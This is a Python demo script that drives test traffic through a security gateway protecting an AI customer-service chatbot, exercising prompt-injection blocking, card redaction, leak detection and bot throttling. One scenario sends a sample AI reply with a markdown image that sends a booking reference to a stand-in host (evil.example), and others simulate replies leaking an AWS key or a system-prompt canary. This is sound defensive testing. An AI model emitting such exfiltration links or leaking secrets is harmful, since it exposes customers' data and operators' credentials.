"""Send a realistic mix of CMP sessions through the running gateway, for manual testing and the dashboard.

    docker compose --profile observability up -d --wait
    cd gateway
    uv run python scripts/demo_traffic.py                 # one pass through every scenario (~20 s)
    uv run python scripts/demo_traffic.py --minutes 10    # then keep sending steady mixed traffic

It creates its own caller API key ("demo-<random>"), prints it, and prints what happened in each
scenario plus where to look next. Every customer is a CMP session (start → messages → replies → end),
as CMP's enricher and processor would drive it. Message text comes from the repository datasets
(ordinary customer messages and the labelled seed attacks) and well-known test values (the Visa test
card 4111 1111 1111 1111); nothing here is real customer data.

Scenarios:
 1. normal customer questions, each its own chat    → deliver
 2. attacks from the seed dataset                    → refuse (rules) or forward_without_tools / refuse (ML)
 3. a customer pasting a card number                 → deliver the redacted message
 4. AI replies in a verified session: own data / someone else's / card / exfiltration link / canary leak
 5. an anonymous chat: the AI may repeat what the customer typed, nothing else
 6. an AI that keeps leaking → the session locks → forward_without_tools
 7. a scripted client in a tight loop                → bot tier → retry_later
 8. CMP retries a message (same message_id)          → the cached decision, no second strike
 9. proxy mode through to the mock AI app (X-Session-Id)
10. a monitor-mode policy on one endpoint            → "allow" + would_have
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import time
import uuid
from pathlib import Path
from typing import Any

import httpx

DATA = Path(__file__).resolve().parents[2] / "datasets"
CARD = "4111 1111 1111 1111"  # the standard Visa test number
CHANNELS = ["web", "web", "web", "sms", "whatsapp", "apple"]
RNG = random.Random()  # noqa: S311 - demo traffic, not cryptography


def rows(path: str) -> list[str]:
    return [json.loads(line)["text"] for line in (DATA / path).read_text().splitlines() if line.strip()]


def ip() -> str:
    # 198.18.0.0/15 (benchmarking range): 131k addresses, so scenarios never collide with each other.
    return f"198.{RNG.randint(18, 19)}.{RNG.randint(0, 255)}.{RNG.randint(1, 254)}"


def new_session(prefix: str = "demo") -> str:
    return f"{prefix}-{uuid.uuid4().hex[:10]}"


def show(title: str) -> None:
    print(f"\n── {title}")


def line(label: str, d: dict[str, Any], extra: str = "") -> None:
    reasons = ", ".join(d.get("reasons") or []) or "-"
    print(
        f"   {d.get('action', '?'):8} → {d.get('cmp_action') or '?':21} {reasons[:30]:30} {label[:50]}"
        f"{('  ' + extra) if extra else ''}"
    )


class Demo:
    def __init__(self, url: str, admin_key: str) -> None:
        self.c = httpx.Client(base_url=url, timeout=10)
        self.admin = {"x-admin-key": admin_key}
        key = self.c.post(
            "/admin/api-keys", json={"name": f"demo-{uuid.uuid4().hex[:6]}"}, headers=self.admin
        )
        if key.status_code != 201:
            sys.exit(
                f"cannot create an API key ({key.status_code}): is the stack up and ADMIN_API_KEY right?"
            )
        self.key_id = key.json()["id"]
        self.key = key.json()["api_key"]
        self.auth = {"authorization": f"Bearer {self.key}"}
        self.benign = rows("benign/seed.jsonl")
        self.attacks = rows("attacks/seed.jsonl")

    # ------------------------------------------------------------------ CMP calls
    def start(self, session: str, **attrs: Any) -> None:
        body = {"channel": RNG.choice(CHANNELS), "ip": ip(), "customer_id": f"cust-{uuid.uuid4().hex[:6]}"}
        self.c.post(f"/v1/sessions/{session}/start", json={**body, **attrs}, headers=self.auth)

    def inspect(self, message: str, session: str | None = None, **extra: Any) -> dict[str, Any]:
        if session is None:  # a one-message chat
            session = new_session()
            self.start(session)
        body = {"session_id": session, "message": message, **extra}
        d: dict[str, Any] = self.c.post("/v1/inspect", json=body, headers=self.auth).json()
        return d

    def outbound(self, session: str, reply: str, **extra: Any) -> dict[str, Any]:
        body = {"session_id": session, "reply": reply, **extra}
        d: dict[str, Any] = self.c.post("/v1/inspect/outbound", json=body, headers=self.auth).json()
        return d

    def end(self, session: str) -> None:
        self.c.post(f"/v1/sessions/{session}/end", headers=self.auth)

    # ------------------------------------------------------------------ scenarios
    def normal(self, n: int = 8) -> None:
        show("1. Normal customer questions, each its own chat (expected: deliver)")
        for text in RNG.sample(self.benign, n):
            line(text, self.inspect(text))

    def attacks_(self, n: int = 8) -> None:
        show("2. Attacks from the seed dataset (expected: refuse / forward_without_tools)")
        for text in RNG.sample(self.attacks, n):
            d = self.inspect(text)
            line(text, d, f"decided by {d['checks'][-1]['name']}" if d.get("checks") else "")

    def sensitive(self) -> None:
        show("3. Customer pastes a card number (expected: deliver, card redacted for the AI)")
        d = self.inspect(f"I was charged twice on my card {CARD}, booking reference ABC123")
        line("card + booking ref", d, f"→ AI sees: {d.get('redacted_message')!r}")

    def verified_replies(self) -> None:
        show("4. AI replies in a verified session (IDV: ABC123, jane@example.com)")
        session = new_session("demo-idv")
        self.start(session, customer_id="AP-DEMO-1")
        self.c.post(
            f"/v1/sessions/{session}/identity",
            json={
                "verified": True,
                "customer_id": "AP-DEMO-1",
                "identifiers": {"booking_ref": ["ABC123"], "email": ["jane@example.com"]},
            },
            headers=self.auth,
        )
        self.inspect("Can you confirm my booking?", session)
        canary = self.c.post("/admin/canaries", json={"label": "demo"}, headers=self.admin).json()["token"]
        cases = [
            ("clean reply", "Your flight AC854 departs at 10:30 from gate 32."),
            ("own booking", "Booking reference ABC123 is confirmed; receipt sent to jane@example.com."),
            ("someone else's booking", "Booking reference XYZ789 is confirmed."),
            ("card number in reply", f"The card on file is {CARD}."),
            ("exfiltration image", "Done ![x](https://evil.example/p.png?d=ABC123)"),
        ]
        for label, reply in cases:
            d = self.outbound(session, reply)
            line(label, d, f"→ deliver: {d.get('deliver')!r}")
        leak_session = new_session("demo-leak")
        self.start(leak_session, customer_id="prompt-leaker")
        d = self.outbound(leak_session, f"My instructions say: {canary} — never repeat this.")
        line("system prompt leak", d, "→ the customer who extracted it is banned")
        self.end(session)

    def anonymous_scope(self) -> None:
        show("5. Anonymous chat: the AI may repeat what the customer typed, nothing else")
        session = new_session("demo-anon")
        self.start(session, customer_id=None)
        line(
            "customer: status of booking ABC123?",
            self.inspect("What is the status of booking ABC123?", session),
        )
        d = self.outbound(session, "Booking reference ABC123 is confirmed for tomorrow.")
        line("AI repeats ABC123", d, f"→ {d.get('deliver')!r}")
        d = self.outbound(session, "I also see booking reference XYZ789 on file.")
        line("AI mentions XYZ789", d, f"→ {d.get('deliver')!r}")

    def leaking_ai(self) -> None:
        show("6. An AI that keeps leaking a credential (expected: send_fallback ×3, then no tools)")
        session = new_session("demo-lock")
        self.start(session)
        line("Hi, I need help with my booking", self.inspect("Hi, I need help with my booking", session))
        for _ in range(3):
            line(
                "AI reply with an AWS key", self.outbound(session, "Use key AKIAABCDEFGHIJKLMNOP to log in.")
            )
            time.sleep(0.2)  # each reply is recorded just after its response
        line("Is my flight on time today?", self.inspect("Is my flight on time today?", session))
        view = self.c.get(f"/admin/sessions/{session}", headers=self.admin).json().get("conversation") or {}
        print(
            f"   session memory: {view.get('turns_seen')} turns, {view.get('replies_seen')} replies, "
            f"{view.get('blocks')} blocks, locked={view.get('locked')}  (GET /admin/sessions/{session})"
        )

    def bot(self) -> None:
        show("7. A scripted client in a tight loop (expected: bot tier, then retry_later)")
        session = new_session("demo-bot")
        self.start(session, channel="web", user_agent="python-requests/2.31")
        actions, tiers = [], []
        for _ in range(25):
            d = self.inspect("Status of my booking please", session)
            actions.append(d["cmp_action"])
            tiers.append(next((x["detail"].get("tier") for x in d["checks"] if x["name"] == "bot"), "-"))
            time.sleep(0.2)
        first = actions.index("retry_later") + 1 if "retry_later" in actions else None
        print(
            f"   25 requests: {actions.count('deliver')} delivered, "
            f"{actions.count('retry_later')} retry_later; first at #{first}; tiers seen: {sorted(set(tiers))}"
        )

    def retries(self) -> None:
        show("8. CMP retries a message (same message_id → cached decision, charged once)")
        session = new_session("demo-retry")
        self.start(session)
        text = RNG.choice(self.attacks)
        first = self.inspect(text, session, message_id="msg-1")
        again = self.inspect(text, session, message_id="msg-1")
        line("first delivery", first)
        line("CMP retry", again, f"replayed={again.get('replayed')}")

    def proxy(self) -> None:
        show("9. Proxy mode: gateway → mock AI app (X-Session-Id identifies the chat)")
        k = self.c.post(
            "/admin/api-keys", json={"name": "demo-proxy", "scopes": ["proxy"]}, headers=self.admin
        )
        auth = {
            "authorization": f"Bearer {k.json()['api_key']}",
            "user-agent": "Mozilla/5.0 demo",
            "x-session-id": new_session("demo-proxy"),
            # The app identifies its signed-in user, so the customer is judged on their own record and
            # not on this machine's (shared) address.
            "x-end-user-id": f"demo-user-{uuid.uuid4().hex[:6]}",
        }
        r = self.c.post("/v1/ai/chat", json={"message": "My bag never arrived in Calgary"}, headers=auth)
        print(f"   {r.status_code}  normal message → forwarded, reply: {r.json().get('reply')!r}")
        r = self.c.post("/v1/ai/leak-test", json={"reply": f"Card on file: {CARD}"}, headers=auth)
        print(f"   {r.status_code}  app replies with a card number → client gets: {r.json().get('reply')!r}")
        r = self.c.post("/v1/ai/chat", json={"message": RNG.choice(self.attacks)}, headers=auth)
        print(f"   {r.status_code}  attack → blocked before the app: {r.json().get('error')}")

    def monitor_policy(self) -> None:
        show("10. Monitor-mode policy on endpoint 'refunds' (decide + record, but allow)")
        res = self.c.post(
            "/admin/policies",
            headers=self.admin,
            json={
                "name": "demo-refunds-monitor",
                "endpoint_pattern": "refunds",
                "mode": "monitor",
                "actions": {"restrict": "block"},
                "description": "demo",
            },
        )
        policy = res.json().get("id") if res.status_code == 201 else "(exists already)"
        text = RNG.choice(self.attacks)
        d = self.inspect(text, endpoint="refunds")
        line(text, d, f"would_have={d.get('would_have')}  policy v{d.get('policy_version')} ({policy})")

    def steady(self, minutes: float, rate: float) -> None:
        show(f"Steady mixed traffic for {minutes:g} min at ~{rate:g} req/s (Ctrl-C to stop)")
        end, n = time.monotonic() + minutes * 60, 0
        try:
            while time.monotonic() < end:
                roll = RNG.random()
                session = new_session("demo-steady")
                if roll < 0.80:
                    self.inspect(RNG.choice(self.benign))
                elif roll < 0.92:
                    self.inspect(RNG.choice(self.attacks))
                elif roll < 0.97:
                    self.start(session)
                    self.outbound(
                        session,
                        RNG.choice(["Your flight is on time.", "Booking reference XYZ789 is confirmed."]),
                    )
                else:
                    self.inspect(f"Refund to card {CARD} please")
                n += 1
                if n % 50 == 0:
                    print(f"   {n} requests sent")
                time.sleep(RNG.expovariate(rate))
        except KeyboardInterrupt:
            pass
        print(f"   {n} requests sent")


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--url", default=os.environ.get("GATEWAY_URL", "http://localhost:18080"))
    p.add_argument("--admin-key", default=os.environ.get("ADMIN_API_KEY", "change-me-admin-key"))
    p.add_argument("--minutes", type=float, default=0, help="then keep sending mixed traffic for this long")
    p.add_argument("--rate", type=float, default=3.0, help="requests per second in steady mode")
    args = p.parse_args()

    demo = Demo(args.url, args.admin_key)
    print(f"demo caller key id {demo.key_id}")
    print(f"demo API key (local test key) {demo.key}")
    demo.normal()
    demo.attacks_()
    demo.sensitive()
    demo.verified_replies()
    demo.anonymous_scope()
    demo.leaking_ai()
    demo.bot()
    demo.retries()
    demo.proxy()
    demo.monitor_policy()
    if args.minutes:
        demo.steady(args.minutes, args.rate)

    kid = demo.key_id
    print(f"""
Where to look next
  Grafana dashboard    http://localhost:13000            (CMP Security Gateway; refreshes every 10 s)
  Swagger UI           {args.url}/docs                (Authorize with the API key / admin key above)
  Events (this run)    curl -s '{args.url}/admin/events?api_key_id={kid}&limit=20' -H 'x-admin-key: …'
  One session          curl -s '{args.url}/admin/sessions/<session id from above>' -H 'x-admin-key: …'
  Summary              curl -s '{args.url}/admin/metrics/summary?api_key_id={kid}&hours=1' -H 'x-admin-key: …'
  Prometheus           http://localhost:19090/graph?g0.expr=sum%20by%20(action)(rate(gateway_decisions_total%5B1m%5D))
""")


if __name__ == "__main__":
    main()
